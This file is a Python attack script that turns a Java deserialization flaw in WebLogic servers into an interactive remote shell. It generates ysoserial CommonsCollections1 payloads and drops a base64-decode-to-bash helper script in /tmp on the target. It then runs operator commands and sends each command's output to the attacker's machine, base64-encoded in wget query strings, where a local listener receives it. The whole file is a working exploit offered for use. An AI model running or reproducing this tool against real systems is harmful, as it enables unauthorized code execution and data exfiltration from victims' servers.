#!/usr/bin/env python
import os, commands, sys, base64, time, re
from optparse import *

from httpserver import listen # httpserver listener
def getresponse():
	listen()

# make a script file used to execute commands
def MakeScript():
	ora = time.strftime("%H:.*--")
	data = time.strftime("--%Y-%m-%d")
	execute("wget http://localhost:25 -O /dev/null -o /tmp/asd")
	execute("sed s/"+data+"/echo/ -i /tmp/asd")
	execute("sed s/"+ora+"/$1|base64/ -i /tmp/asd")
	execute("sed s/http/-d|bash;exit;/ -i /tmp/asd")

# if redirection is used, replace it with dd
def check_redir(cmd):
	if '>' in cmd:
		pos = cmd.find('>')
		RedirFile = cmd[pos+1:].strip()
		return cmd[:pos].strip()+'|dd of='+RedirFile
	else:
		return cmd

# execute commands and retrieve the output
def work(cmd):
	cmd = check_redir(cmd)
	do(cmd+" > /tmp/asd2")
	do("cat /tmp/asd2 | base64 > /tmp/b64_asd2")
	do("sleep 1;for b in $(cat /tmp/b64_asd2);do wget http://"+my_ip+"?$b -O /dev/null -o /dev/null;done;wget http://"+my_ip+"?66696e65 -O /dev/null -o /dev/null")
	getresponse()

# call the script with base64 encoded cmd	
def do(cmd):
	encoded_cmd = base64.b64encode(cmd)
	execute("bash /tmp/asd "+encoded_cmd)

# make the evil serialized object and send it to the target
def execute(cmd):
	os.system("java -jar ysoserial.jar CommonsCollections1 '%s' > _cmd_"%cmd)
	os.system("python weblogic.py "+target_ip+" "+target_port+" _cmd_ > /dev/null 2>/dev/null")	
	os.system("rm _cmd_")
		
# get cmd and exit
def get_cmd():
	cmd=raw_input("\n$> ")
	if (cmd.strip() == "exit"):
		delFiles()
		print "Bye!"
		sys.exit()
	work(cmd)

# check if target is valid ip address
def ValidIPAddress(IP):
	pattern = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
	if pattern.match(IP):
		return 1
	else:
		return 0

# delete all previously created files
def delFiles():
	execute("rm /tmp/asd /tmp/asd2 /tmp/b64_asd2")


#########################################
#		MAIN                    #
#########################################


parser = OptionParser(usage='%prog [options]', description='Serialized objects command execution')
parser.add_option('-t', '--target', type='string', dest="target", help='target ip')
parser.add_option('-p', '--port', type='string', dest="port", help='target port')
parser.add_option('-r', '--reverse', type='string', dest="reverse", help='cmd exec reverse ip (default my ip)')

(options, args) = parser.parse_args()

if options.target is None or options.port is None:
	print "\n--target and --port option required\n"
	parser.print_help()
	print "\n"
        sys.exit()

if options.reverse is None:
	my_ip = commands.getoutput('ifconfig eth0 | grep "inet " | cut -d " " -f10') # get my ip
else:
	my_ip = options.reverse

target_ip = options.target
target_port = options.port

if ValidIPAddress(target_ip):
	MakeScript()
	while 1:
		get_cmd()
else:
	print "Unexpected target format"

